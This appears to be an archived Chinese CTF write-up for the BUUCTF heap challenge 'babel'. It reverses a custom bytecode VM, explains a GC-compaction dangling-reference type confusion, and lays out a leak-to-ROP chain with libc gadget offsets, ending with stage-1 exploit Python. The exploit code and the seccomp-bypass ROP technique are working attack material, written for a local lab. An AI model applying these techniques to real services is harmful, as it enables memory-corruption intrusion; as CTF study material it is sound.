# 知识点

堆

# 题目分析

分类：pwn / 堆。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [babel/Dockerfile](babel/Dockerfile)
- [babel/babel](babel/babel)
- [babel_wp.md](babel_wp.md)
- [chal/Dockerfile](chal/Dockerfile)
- [chal/babel](chal/babel)
- [dump.gdb](dump.gdb)
- [exploit.py](exploit.py)
- [exploit2.py](exploit2.py)
- [exploit_remote.py](exploit_remote.py)
- [fuzz.py](fuzz.py)
- [gc_test.py](gc_test.py)
- [inputs/a0.bin](inputs/a0.bin)
- [inputs/a1.bin](inputs/a1.bin)
- [inputs/a2.bin](inputs/a2.bin)
- [inputs/a3.bin](inputs/a3.bin)
- [inputs/a4.bin](inputs/a4.bin)
- [inputs/a5.bin](inputs/a5.bin)
- [inputs/a6.bin](inputs/a6.bin)
- [inputs/a7.bin](inputs/a7.bin)
- [inputs/a8.bin](inputs/a8.bin)
- [inputs/a9.bin](inputs/a9.bin)
- [inputs/be_len1.bin](inputs/be_len1.bin)
- [inputs/big_len.bin](inputs/big_len.bin)
- [inputs/len0.bin](inputs/len0.bin)
- [inputs/len1_41.bin](inputs/len1_41.bin)
- [inputs/len4_00000000.bin](inputs/len4_00000000.bin)
- [inputs/len4_41414141.bin](inputs/len4_41414141.bin)
- [inputs/onezero.bin](inputs/onezero.bin)
- [lab/babel_239](lab/babel_239)
- [layout.py](layout.py)
- [layout2.py](layout2.py)
- [probe2.py](probe2.py)
- [probe3.py](probe3.py)
- [probe4.py](probe4.py)
- [probe5.py](probe5.py)
- [stage1.py](stage1.py)
- [stage1b.py](stage1b.py)
- [stage1dbg.py](stage1dbg.py)
- [stage2.py](stage2.py)
- [vm.py](vm.py)

## 已有分析

- [babel_wp.md](babel_wp.md)

### babel (BUUCTF) — 在 UTM 虚拟机中本地复现并 getshell 读取 /flag

> 目标：在 macOS 的 UTM (QEMU/TCG, x86_64) 虚拟机里跑通题目，拿到本地 `/flag`。
> 结果：**已拿到** `flag{local_utm_babel_pwned}`（容器内 `/flag` 内容），3 次不同 ASLR 基址下均 100% 成功。

---

#### 0. 结论速览

| 项目 | 内容 |
|---|---|
| 文件 | `babel`：ELF64 PIE, stripped, ~419KB, 依赖 glibc 2.38+（Ubuntu 24.04 / libc 2.39-0ubuntu8.9） |
| 本质 | OCaml native 程序 + 手写 C 版「Babel」字节码虚拟机（64 项 dispatch 表 + 256 字节 opcode 映射表） |
| 沙箱 | 启动时 `prctl(PR_SET_NO_NEW_PRIVS)` + `seccomp(BPF)` 21 条规则：只放行 `read/write/exit/exit_group/close/openat` 与 syscall 192/224，其余 `SECCOMP_RET_KILL` |
| 输入协议 | `read(0,&len,4)` → `read(0, buf, len)` → `babel_dispatch(buf,len)`，**循环**读多段程序（VM 状态在段之间保持），单段 ≤ 0x10000 字节 |
| 漏洞 | GC 压缩阶段的「引用重写」可被绕过：把 list 的 type 字段改成 0（字符串类型）后 GC 不再扫描其元素 → 元素里的引用变成**悬垂引用**，压缩后指向别的对象 → 类型混淆 |
| 利用 | 悬垂 `tag9` 引用落到 list 上 → 通过 `bind` 的 `+0x14 == -1` 检查 → 把资源表指针改成**任意地址** → 任意读写 → 泄漏 PIE/libc → 改写 CORE 表劫持 RIP → `mov rsp,rdx; ret` 栈迁移 → ROP `open("/flag")+read+write` |

---

#### 1. 在 UTM 里跑起来

机器里已有 UTM 虚拟机 `Linux.utm`（x86_64, QEMU-TCG），并且把宿主 `~/Desktop/work` 以 9p 共享挂到 guest 的 `/mnt/work`。

```bash
### guest 是 Ubuntu 22.04(glibc 2.35)，题目要 2.38+，两种办法：

### (A) 直接从 ubuntu:24.04 镜像里抠 libc 2.39 + 打补丁（最快，用于调试）
docker create --name u24 ubuntu:24.04
docker cp u24:/lib/x86_64-linux-gnu/libc.so.6            lab/lib/
docker cp u24:/lib/x86_64-linux-gnu/libm.so.6            lab/lib/
docker cp u24:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 lab/lib/ld-2.39.so
docker rm u24
patchelf --set-interpreter /mnt/work/buuctf/other/2.39/amd64/babel/lab/lib/ld-2.39.so \
         --set-rpath /mnt/work/buuctf/other/2.39/amd64/babel/lab/lib lab/babel_239
./lab/babel_239 < prog.bin          # 本地调试用，速度最快

### (B) 按题目 Dockerfile 起真实环境（xinetd 监听 8888）
###     原 Dockerfile 里 useradd -u 1000 会与 ubuntu:24.04 自带的 ubuntu 用户冲突，改成 2000 即可
docker build -t babel_chal chal/
docker run -d --name babel_run -p 8888:8888 -e FLAG='flag{local_utm_babel_pwned}' babel_chal
```

> 说明：题目 Dockerfile 的 entrypoint 支持 `FLAG` 环境变量；不设置时 `/flag` 内容是
> `flag{set_FLAG_env_or_mount_/flag}`，设 `FLAG_RANDOM=1` 则随机。所以“本地 flag”的值
> 取决于你在启动容器时注入的 `FLAG`；exp 本身与 flag 内容无关，直接读 `/flag`。

---

#### 2. 逆向：Babel 字节码 ISA

`main`(0xd710) → `init`(0xdc20) 建表 → 循环 `read(0,4B len)` + `read(0,len)` → `babel_dispatch`(0xdb80)。

dispatch 逻辑：
```
op = map[byte]            ; map 位于 0x75f60，256 字节，>=0x40 即 "babel: bad opcode"
if (op < 0x40) tableop（见上方完整分析记录）   ; table 位于 0x76060，64 项函数指针
```
真正有效的 opcode 只有 22 个（其余槽位指向 bad-opcode/trap 桩）：

| 字节 | 语义 | 说明 |
|---|---|---|
| 0x00 | nop | |
| 0x01 | push imm64 | 入栈 `imm<<1`（**值 = 立即数的两倍**） |
| 0x02 | push str | `u32 len + 数据`，堆上分配 tag1 字符串，`capacity=max(len,1)` |
| 0x03 | dup | |
| 0x04 | pop | |
| 0x05/0x06/0x07 | add / sub / mul | 结果恒为偶数（`&~1`） |
| 0x08 / 0x09 | list(n) / pair(n) | 出栈 n 个值建 tag3 / tag5 对象，`+0x14 = -1` |
| 0x0a / 0x0b | 取/存 第 i 个 qword | 只接受 tag3/tag5，越界即 type trap |
| 0x0c / 0x0d | 取/存 字符串第 i 字节 | 只接受 tag1，`i < capacity` |
| 0x0e | len | |
| 0x10 / 0x11 | 读/写 局部变量（0..255） | 数组在 0x9f290 |
| 0x12 | print | tag1 打印内容，其它打印 `value>>1` |
| 0x13 | 原样输出 8 字节 | |
| 0x14 | handle(k) | 建 tag7 对象，`+0x10 = k&0xf`，`+0x18 = &handle_tbl[k]` |
| 0x15 | call nargs | 取 handle，`+0x10 <3` 时 `CORE[idx](0x59010, nargs)` |
| 0x16 | input(n) | 在 4MB region2 里开缓冲，占 8 个资源槽之一，推 tag9 引用 |
| 0x17 / 0x18 | 读/写 缓冲第 i 字节 | 只接受 tag9，槽号 `+0x18 < 8` |
| 0x19 | bind | 要求 tag9 **且对象 `+0x14 == -1`**，把 `resources[+0x18] = {value>>1, 0x100000}` |
| 0x20 | call2 idx,nargs | 直接 `CORE[idx&0xf](0x59010, nargs)`（idx < 3） |
| 0xff | 返回 2 → 结束 | |

值模型：`value = (对堆内偏移 << 4) | tag`；tag 1=str，3=list，5=pair，7=handle，9=buffer；
整数是偶数（`2n`）。堆 16MB（`0x76260`），对象头 0x20：`+0 type / +8 size / +0x10 len /
+0x14 cap(-1=raw) / +0x18 data_off`，数据从 `+0x18` 开始，分配位图在 `0x7627c`。

关键全局：VM 栈 `0x97290`（4096 qword，sp 在 `0x97288`）、局部变量 `0x9f290`、
GC 表 `0x9fa90/0xbfa90/0xdfa90`、资源表 `0x75e40`(16×16B)、内建函数指针表 `0x75ec0`。

---

#### 3. 漏洞：GC 压缩制造的悬垂引用（类型混淆）

GC(`0xe710`) 是 mark-compact：
1. 清 mark；2. 从 **栈[0..sp-1] + 局部变量[0..255] + chain 表** 出发标记；
3. 按老偏移升序把存活对象**压紧**到堆低端；4. **改写**这些根里的引用为 `(新偏移<<4)|原tag`。

**被扫描对象的数据区**只针对 type∈{1,2,3}；type==0 被视为字符串，GC 只把它的 `+0x18`（data_off）
改成 `新偏移+0x20`，**不扫描元素**。

于是：
1. 用 `str(len=0)` 在 0x20 放一个 0 长度字符串（cap=1，data_off=自身+0x20，正好指向下一个对象头），
   `setb 0` 就能把下一个对象的 `type` 低字节写成 0 —— 把一个 `list` 伪装成字符串；
2. 这个"隐形 list"里放两个引用：`(0x50<<4)|3` 指向随后分配的**死** list，`(0x70<<4)|9` 指向**死** buffer；
3. 触发 GC（堆上限其实只有 0x8000，`str(0x7ff0)` 就能触发）：两个死对象被回收，存活对象
   `handle(0x90) → 0x50`、`list(0xB0) → 0x70`，而隐形 list 里的两个引用**没有被改写**；
4. 结果：
   - `(0x50<<4)|3` 现在指向 **handle 对象** → `gete 0` 读出 `&handle_tbl[1] = PIE+0x590a0` → **PIE 泄漏**；
   - `(0x70<<4)|9` 现在指向 **list 对象**（`+0x14 == -1`、`+0x18 == 0`）→ **`bind` 的类型检查被满足**
     → `resources[0] = {任意地址, 0x100000}` → 配合 `bget/bset` 得到**任意地址字节读写**。

---

#### 4. 利用链

```
帧1: 堆布局(str0, 隐形list3, 死list, 死input16, 活handle1, 活list) → str(0x7ff0) 触发 GC
     → gete 泄漏 PIE base
帧2: bind(PIE+0x58000) → bget 逐字节读 read@got(0x58d30) → libc base
帧3: 用 bset 逐字节写：
        PIE+0x59100 : "/flag\0"
        PIE+0x97290 : ROP 链（直接写进 VM 操作数栈）
        PIE+0x75ec0 : CORE[0] = libc + 0x5ef6f   (mov rsp, rdx ; ret)
     push 64 个 0 → hdl 0 → call 64
```

为什么能劫持栈：`call *CORE[idx]` 处寄存器是 `rdi = 0x59010`（可写 .data）、
`rsi = nargs`、`rdx = 0x97290 + 8*((sp-1)-nargs)` —— **rdx 正好指向 VM 操作数栈**，而它完全由我们控制。
把 `CORE[0]` 改成 `mov rsp, rdx ; ret`，`rsp` 就落到我们写好的 ROP 链上。

ROP（libc 2.39 内的 gadget）：
`pop rdi;ret`(0x10c08d) `pop rsi;ret`(0x110b7d) `mov rdx,[rsp+0x10];..;add rsp,0x38;ret`(0x12e20c)
+ `open`(0x11b3f0) / `read`(0x11bd20) / `write`(0x11c830)：
```
pop rdi; "/flag" ; pop rsi; 0 ; open
pop rdi; 3 ; pop rsi; buf ; [rdx=0x100] ; read
pop rdi; 1 ; pop rsi; buf ; [rdx=0x100] ; write
```
`open` 走 `openat` 系统调用 —— 正好在 seccomp 白名单里，所以这条路是作者有意留的。

运行结果：
```
[*] PIE base = 0x586cb7b7f000
[*] libc base = 0x7e8df7a70000
[*] output: b'flag{local_utm_babel_pwned}\x00...'
```

---

#### 5. 我额外发现但没走到底的路（以及取舍）

1. **chain 表 0x203 vs 0x200 越界**：`0xefa0/0xe640` 搜索空槽时上界写成 `0x203`，而表
   `0x96280` 只有 512 项。写满 512 项后再插入，会越界写到 `0x97280`(GC 计数)、`0x97288`(**sp**)、
   `0x97290`(栈[0])。改 sp 之后 `pop/print` 可以读写任意 8 字节对齐地址（`.bss` 相对偏移已知），
   是一条**只读**的任意读原语。它的价值在于：`sp` 可设为极大值，`list(n)` 会把任意内存拷进堆list，
   从而把任意 qword **变成 VM 值**。缺点：`push` 有 `sp<=0xfff` 检查，拿不到任意写；且 `0x97280`
   会被 GC 自己清零，需要先跑一次 GC。这条线与最终的 GC 悬垂引用线互为备选。
2. **`bind` 的 `+0x14 == -1` 只认 list/pair 头**，而 tag9 引用只能由 `input` 产生 → 二者在正常
   语义下永远对不上，**这基本可以确定是作者埋的"必须靠内存破坏跨过去"的关卡**，而不是随手写的校验。
3. **不做 ROP 的替代**：把 `read@got` 改成 `openat` 之类单点改写都不成立（fd/path 参数对不上）；
   `system`/`execve` 被 seccomp 杀（filter 里没有 execve），所以**必须**用 openat+read+write 的
   ROP；SROP (`rt_sigreturn`) 同样被 filter 杀掉。`setcontext` 入口第一条就是 `rt_sigprocmask`
   系统调用，直接用会被 kill，这也解释了为什么最后选了 `mov rsp,rdx;ret` 而不是经典 setcontext。
4. **不依赖泄漏的想法**：堆偏移是确定性的（bump 分配从 0 开始），但 PIE/libc 基址仍需要泄漏；
   而"值只能是偶数或已有引用"这一约束让**伪造引用必须靠内存破坏**（算术 `&~1` 会清掉 tag），
   这是整个题的核心难点。
5. **GC 触发阈值只有 0x8000**（`0x59090`），远小于 16MB 的 mmap 区，所以 GC 很廉价、
   可反复触发 —— 这既是漏洞来源，也让 exp 很稳。

---

#### 6. 复现命令

```bash
ssh ubuntu                     # 进入 UTM 虚拟机
cd /mnt/work/buuctf/other/2.39/amd64/babel
python3 exploit_remote.py      # 打 127.0.0.1:8888，打印 /flag
```

文件：
- `exploit_remote.py` —— 最终 exp（TCP 版，自适应 ASLR）
- `exploit2.py` —— 同一 exp 的本地 stdin 版本
- `vm.py` —— 汇编器 + 运行器（ISA 编码 / 逐条探测）
- `stage1.py` / `stage1b.py` / `stage2.py` —— 分阶段验证（GC 压缩、悬垂引用、泄漏）
- `dump.gdb` —— 运行时 dump opcode map / dispatch 表 / 全局指针
- `fuzz.py` —— 类型感知 fuzzer（没跑出崩溃，说明显式边界检查基本到位，漏洞在 GC 语义层）


# EXP

- [exploit.py](exploit.py)
- [exploit2.py](exploit2.py)
- [exploit_remote.py](exploit_remote.py)
- [fuzz.py](fuzz.py)
- [gc_test.py](gc_test.py)
- [layout.py](layout.py)
- [layout2.py](layout2.py)
- [probe2.py](probe2.py)
- [probe3.py](probe3.py)
- [probe4.py](probe4.py)
- [probe5.py](probe5.py)
- [stage1.py](stage1.py)
- [stage1b.py](stage1b.py)
- [stage1dbg.py](stage1dbg.py)
- [stage2.py](stage2.py)
- [vm.py](vm.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
import vm, struct, subprocess, sys, time

BIN = "/mnt/work/buuctf/other/2.39/amd64/babel/lab/babel_239"

# ---- offsets inside the PIE binary ----
OFF_WRITE_GOT = 0x58f48
OFF_READ_GOT  = 0x58d30
OFF_DATA      = 0x59100      # scratch: "/flag" at +0, buffer at +0x40
OFF_CORE0     = 0x75ec0      # builtin[0] pointer (called as CORE[0](rdi=fake, rsi=nargs))
OFF_VMSTACK   = 0x97290      # VM operand stack (ROP stack after pivot)

# ---- libc offsets (resolved for the challenge libc.so.6) ----
L_POP_RDI   = 0x10c08d
L_POP_RSI   = 0x110b7d
L_OPEN      = 0x11b3f0
L_READ      = 0x11bd20
L_WRITE     = 0x11c830
L_EXIT      = 0x47ba0
L_MOVRSPRDX = 0x5ef6f        # mov rsp, rdx ; ret
L_SETRDX    = 0x12e20c       # mov rdx,[rsp+0x10]; mov rcx,[rsp+8]; mov rax,[rsp]; add rsp,0x38; ret
L_READ_OFF  = 0x11bd20

def frame(p):
    c = vm.asm(p)
    assert len(c) <= 0x10000, len(c)
    return struct.pack('<I', len(c)) + c

def run(data, timeout=120):
    p = subprocess.run([BIN], input=data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)
    return p.returncode, p.stdout, p.stderr

# ---------------- Stage 1: heap grooming + GC + PIE leak ----------------
S_HL, S_S0, S_H, S_A = 0, 1, 2, 3

def stage1():
    p = []
    p += [('str', b''), ('stl', S_S0)]                                  # S0 @0x00
    p += [('push',0),('push',0),('push',0),('list',3),('stl',S_HL)]     # HL @0x20
    p += [('ldl',S_S0),('push',0),('setb',0)]                           # HL.type = 0 (GC-invisible)
    p += [('ldl',S_HL),('push',0),('list',1),('sete',1)]                # D @0x50 -> HL[1]
    p += [('ldl',S_HL),('input',16),('sete',2)]                         # B @0x70 -> HL[2]
    p += [('hdl',1),('stl',S_H)]                                        # H   @0x90 (live)
    p += [('push',0),('list',1),('stl',S_A)]                            # A   @0xB0 (live)
    p += [('str', b'Z'*0x7ff0), ('pop',)]                               # trigger GC -> compaction
    p += [('ldl',S_HL),('gete',1),('gete',0),('print',)]                # leak base+0x590a0
    return p

rc, out, err = run(frame(stage1()))
print("stage1 rc=", rc, "out=", out, "err=", err[:80])
if rc != 0:
    sys.exit(1)
leak = int(out.split()[0])
raw = leak * 2 if leak >= 0 else (leak * 2 + (1<<64))
# handle table pointer &0x59098[1] = base + 0x590a0
pie = raw - 0x590a0
print("PIE base =", hex(pie), "aligned:", pie & 0xfff == 0)
```
